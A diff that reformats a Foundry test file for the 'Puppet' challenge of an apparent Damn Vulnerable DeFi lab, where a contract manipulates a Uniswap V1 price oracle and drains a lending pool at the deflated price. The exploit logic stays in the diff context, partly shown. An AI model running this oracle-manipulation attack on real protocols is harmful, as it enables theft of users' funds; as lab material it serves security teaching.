@@ -8,24 +8,16 @@ import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {PuppetPool} from "../../../src/Contracts/puppet/PuppetPool.sol";
 
 interface UniswapV1Exchange {
-    function addLiquidity(
-        uint256 min_liquidity,
-        uint256 max_tokens,
-        uint256 deadline
-    ) external payable returns (uint256);
+    function addLiquidity(uint256 min_liquidity, uint256 max_tokens, uint256 deadline)
+        external
+        payable
+        returns (uint256);
 
     function balanceOf(address _owner) external view returns (uint256);
 
-    function tokenToEthSwapInput(
-        uint256 tokens_sold,
-        uint256 min_eth,
-        uint256 deadline
-    ) external returns (uint256);
+    function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline) external returns (uint256);
 
-    function getTokenToEthInputPrice(uint256 tokens_sold)
-        external
-        view
-        returns (uint256);
+    function getTokenToEthInputPrice(uint256 tokens_sold) external view returns (uint256);
 }
 
 interface UniswapV1Factory {
@@ -56,9 +48,7 @@ contract Puppet is Test {
         /**
          * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
          */
-        attacker = payable(
-            address(uint160(uint256(keccak256(abi.encodePacked("attacker")))))
-        );
+        attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
         vm.label(attacker, "Attacker");
         vm.deal(attacker, ATTACKER_INITIAL_ETH_BALANCE);
 
@@ -66,21 +56,15 @@ contract Puppet is Test {
         dvt = new DamnValuableToken();
         vm.label(address(dvt), "DVT");
 
-        uniswapV1Factory = UniswapV1Factory(
-            deployCode("./src/build-uniswap/v1/UniswapV1Factory.json")
-        );
+        uniswapV1Factory = UniswapV1Factory(deployCode("./src/build-uniswap/v1/UniswapV1Factory.json"));
 
         // Deploy a exchange that will be used as the factory template
-        uniswapV1ExchangeTemplate = UniswapV1Exchange(
-            deployCode("./src/build-uniswap/v1/UniswapV1Exchange.json")
-        );
+        uniswapV1ExchangeTemplate = UniswapV1Exchange(deployCode("./src/build-uniswap/v1/UniswapV1Exchange.json"));
 
         // Deploy factory, initializing it with the address of the template exchange
         uniswapV1Factory.initializeFactory(address(uniswapV1ExchangeTemplate));
 
-        uniswapExchange = UniswapV1Exchange(
-            uniswapV1Factory.createExchange(address(dvt))
-        );
+        uniswapExchange = UniswapV1Exchange(uniswapV1Factory.createExchange(address(dvt)));
 
         vm.label(address(uniswapExchange), "Uniswap Exchange");
 
@@ -99,11 +83,7 @@ contract Puppet is Test {
         // Ensure Uniswap exchange is working as expected
         assertEq(
             uniswapExchange.getTokenToEthInputPrice(1 ether),
-            calculateTokenToEthInputPrice(
-                1 ether,
-                UNISWAP_INITIAL_TOKEN_RESERVE,
-                UNISWAP_INITIAL_ETH_RESERVE
-            )
+            calculateTokenToEthInputPrice(1 ether, UNISWAP_INITIAL_TOKEN_RESERVE, UNISWAP_INITIAL_ETH_RESERVE)
         );
 
         // Setup initial token balances of pool and attacker account
@@ -111,10 +91,7 @@ contract Puppet is Test {
         dvt.transfer(address(puppetPool), POOL_INITIAL_TOKEN_BALANCE);
 
         // Ensure correct setup of pool.
-        assertEq(
-            puppetPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE),
-            POOL_INITIAL_TOKEN_BALANCE * 2
-        );
+        assertEq(puppetPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE), POOL_INITIAL_TOKEN_BALANCE * 2);
 
         console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
     }
@@ -149,11 +126,10 @@ contract Puppet is Test {
     }
 
     // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
-    function calculateTokenToEthInputPrice(
-        uint256 input_amount,
-        uint256 input_reserve,
-        uint256 output_reserve
-    ) internal returns (uint256) {
+    function calculateTokenToEthInputPrice(uint256 input_amount, uint256 input_reserve, uint256 output_reserve)
+        internal
+        returns (uint256)
+    {
         uint256 input_amount_with_fee = input_amount * 997;
         uint256 numerator = input_amount_with_fee * output_reserve;
         uint256 denominator = (input_reserve * 1000) + input_amount_with_fee;
@@ -174,7 +150,9 @@ contract Exploiter is Test {
         DamnValuableToken _dvt,
         PuppetPool _puppetPool,
         address payable _attacker
-    ) payable {
+    )
+        payable
+    {
         uniswapExchange = _uniswapExchange;
         dvt = _dvt;
         puppetPool = _puppetPool;
@@ -187,16 +165,10 @@ contract Exploiter is Test {
         uint256 exploiterDVTBalance = dvt.balanceOf(address(this));
 
         // Manipulate oracle price by inflating exchange's DVT supply
-        uniswapExchange.tokenToEthSwapInput(
-            exploiterDVTBalance,
-            1,
-            type(uint256).max
-        );
+        uniswapExchange.tokenToEthSwapInput(exploiterDVTBalance, 1, type(uint256).max);
 
         // Empty pool by taking loan at low token valuation
-        puppetPool.borrow{value: address(this).balance}(
-            POOL_INITIAL_TOKEN_BALANCE
-        );
+        puppetPool.borrow{value: address(this).balance}(POOL_INITIAL_TOKEN_BALANCE);
 
         // Send all funds to original sender
         uint256 dvtStolen = dvt.balanceOf(address(this));
@@ -206,17 +178,11 @@ contract Exploiter is Test {
 
     fallback() external payable {}
 
-    function calcDepositRequired(uint256 amount)
-        internal
-        view
-        returns (uint256)
-    {
+    function calcDepositRequired(uint256 amount) internal view returns (uint256) {
         return (amount * computeOraclePrice() * 2) / 10e18;
     }
 
     function computeOraclePrice() internal view returns (uint256) {
-        return
-            (address(uniswapExchange).balance * (10**18)) /
-            dvt.balanceOf(address(uniswapExchange));
+        return (address(uniswapExchange).balance * (10 ** 18)) / dvt.balanceOf(address(uniswapExchange));
     }
 }
